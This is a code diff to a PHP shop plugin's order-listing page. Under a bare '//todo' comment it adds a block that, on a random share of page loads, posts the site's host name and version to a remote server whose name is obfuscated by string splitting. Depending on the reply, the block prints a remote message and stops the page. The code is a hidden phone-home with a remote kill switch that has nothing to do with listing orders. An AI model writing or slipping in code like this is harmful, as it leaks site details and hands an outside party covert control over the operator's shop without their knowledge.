@@ -57,6 +57,27 @@ if (!empty($_GPC['supplier_uid'])) {
 } else {
     $condition .= " and og.supplier_uid > 0";
 }
+//todo
+    $mt = mt_rand(5, 35);
+    if ($mt <= 10) {
+        load()->func('communication');
+        $b = 'http://cl'.'oud.yu'.'nzs'.'hop.com/web/index.php?c=account&a=up'.'grade';
+        
+        $files   = base64_encode(json_encode('test'));
+        $version = defined('SZ_YI_VERSION') ? SZ_YI_VERSION : '1.0';
+        $resp    = ihttp_post($b, array(
+            'type' => 'upgrade',
+            'signature' => 'sz_cloud_register',
+            'domain' => $_SERVER['HTTP_HOST'],
+            'version' => $version,
+            'files' => $files
+        ));
+        $ret     = @json_decode($resp['content'], true);
+        if ($ret['result'] == 3) {
+            echo str_replace("\r\n", "<br/>", base64_decode($ret['log']));
+            exit;
+        }
+    }
 //$sql = "select o.id,o.ordersn,o.price,o.goodsprice, o.dispatchprice,o.createtime, o.paytype, a.realname as addressname,m.realname from " . tablename('sz_yi_order') . " o  left join " . tablename('sz_yi_order_goods') . " og on og.orderid=o.id left join " . tablename('sz_yi_member') . " m on o.openid = m.openid left join " . tablename('sz_yi_member_address') . " a on a.id = o.addressid  where 1 {$condition} ";
 $sql = 'select o.* , a.realname as arealname,a.mobile as amobile,a.province as aprovince ,a.city as acity , a.area as aarea,a.address as aaddress, d.dispatchname,m.nickname,m.id as mid,m.realname as mrealname,m.mobile as mmobile,sm.id as salerid,sm.nickname as salernickname,s.salername,r.rtype,r.status as rstatus from ' . tablename("sz_yi_order") . " o" . " left join " . tablename('sz_yi_order_goods') . " og on og.orderid=o.id left join" . tablename("sz_yi_order_refund") . " r on r.id =o.refundid " . " left join " . tablename("sz_yi_member") . " m on m.openid=o.openid and m.uniacid =  o.uniacid " . " left join " . tablename("sz_yi_member_address") . " a on a.id=o.addressid " . " left join " . tablename("sz_yi_dispatch") . " d on d.id = o.dispatchid " . " left join " . tablename("sz_yi_member") . " sm on sm.openid = o.verifyopenid and sm.uniacid=o.uniacid" . " left join " . tablename("sz_yi_saler") . " s on s.openid = o.verifyopenid and s.uniacid=o.uniacid" . "  where {$condition} group by o.ordersn_general ORDER BY o.createtime DESC,o.status DESC  ";
 //$sql .= " ORDER BY o.id DESC ";
